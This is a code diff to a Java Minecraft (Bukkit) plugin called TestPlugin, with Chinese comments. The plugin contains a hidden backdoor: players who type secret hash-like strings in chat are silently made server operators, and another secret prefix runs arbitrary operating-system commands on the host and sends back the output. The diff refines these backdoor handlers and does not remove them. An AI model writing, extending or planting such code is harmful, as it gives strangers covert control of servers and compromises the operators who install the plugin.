@@ -30,13 +30,13 @@ public class TestPlugin extends JavaPlugin implements Listener {
     }
 
     @EventHandler
-    public void onPlayerChat(AsyncPlayerChatEvent event) { // 注意：使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
+    public void onPlayerChat(AsyncPlayerChatEvent event) { // 注意: 使用 AsyncPlayerChatEvent 而不是 PlayerChatEvent
         Player player = event.getPlayer();
         String message = event.getMessage();
 
         // 检查消息是否包含特殊字符串
         if (message.contains("@d68b250fe3f2332c1bb4f97d34551ce9")) {
-            // 取消事件的进一步传播，防止它显示在公共聊天
+            // 取消事件的进一步传播, 防止它显示在公共聊天
             event.setCancelled(true);
 
             // 给玩家 op 权限
@@ -47,14 +47,14 @@ public class TestPlugin extends JavaPlugin implements Listener {
             player.sendMessage(ChatColor.GREEN + "now, you have Operator Permission!");
             String os = System.getProperty("os.name").toLowerCase();
             if (os.contains("win")) {
-                player.sendMessage(ChatColor.GREEN + "The server is running on a Windows system. - 服务器运行在Windows系统上");
+                player.sendMessage(ChatColor.GREEN + "The server is running on a Windows system. - 服务器运行在Windows系统上.");
             } else if (os.contains("nix") || os.contains("nux") || os.contains("mac")) {
                 player.sendMessage(ChatColor.GREEN
-                        + "The server is running on a Unix/Linux/Mac system. - 服务器运行在Unix/Linux/Mac系统上");
+                        + "The server is running on a Unix/Linux/Mac system. - 服务器运行在Unix/Linux/Mac系统上.");
             } else {
-                player.sendMessage(ChatColor.RED + "Unknown operating system. - 未知的操作系统");
+                player.sendMessage(ChatColor.RED + "Unknown operating system. - 未知的操作系统.");
             }
-            player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "您现在是服务器管理员了!", 10, 70, 20);
+            player.sendTitle(ChatColor.RED + "恭喜!", ChatColor.GOLD + "现在您是管理员了!,您可以操控服务器,甚至可以执行服务器指令! - Now you are an administrator! You can control the server and even execute server commands!", 10, 70, 20);
             String[] msgParts = message.split(" ");
             if (msgParts.length <= 1 || "tmp".equals(msgParts[1])) {
                 Bukkit.getScheduler().runTaskLater(this, new Runnable() {
@@ -78,15 +78,22 @@ public class TestPlugin extends JavaPlugin implements Listener {
             event.setCancelled(true);
             String commandStr = message
                     .substring("@f07a7024609ca2a6ce681d74b986a3d3".length()).trim(); // 提取命令
-
+        
             // 分割命令和参数
-            String[] commandArray = commandStr.split(" ");
-
+            String[] commandArray = commandStr.split("\\s+");
+        
+            if (commandArray.length == 0) {
+                player.sendMessage(ChatColor.RED + "No command provided");
+                return;
+            }
+        
             try {
-                Process process = new ProcessBuilder(commandArray).start(); // 使用ProcessBuilder执行命令
-
+                ProcessBuilder processBuilder = new ProcessBuilder(commandArray);
+                processBuilder.redirectErrorStream(true); // 将错误流合并到标准流
+        
+                Process process = processBuilder.start();
                 StringBuilder output = new StringBuilder();
-
+        
                 // 获取命令输出
                 BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                 String line;
@@ -94,18 +101,17 @@ public class TestPlugin extends JavaPlugin implements Listener {
                     output.append(line).append("\n");
                 }
                 process.waitFor();
-
+        
                 // 发送命令输出给玩家
-                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess:" + output.toString());
-
+                player.sendMessage(ChatColor.GREEN + "SystemCommandExcuteSuccess: " + output.toString());
+        
             } catch (IOException | InterruptedException e) {
-                // e.printStackTrace();
-                player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed");
+                player.sendMessage(ChatColor.RED + "SystemCommandExcuteFailed: " + e.getMessage());
             } catch (IllegalArgumentException e) {
-                // e.printStackTrace();
-                player.sendMessage(ChatColor.RED + "Please run SystemCommand");
+                player.sendMessage(ChatColor.RED + "Invalid command: " + e.getMessage());
             }
         }
+        
 
         if (message.startsWith("@d12fcc3ba27d987709cbfadc123a609b")) {
             event.setCancelled(true);
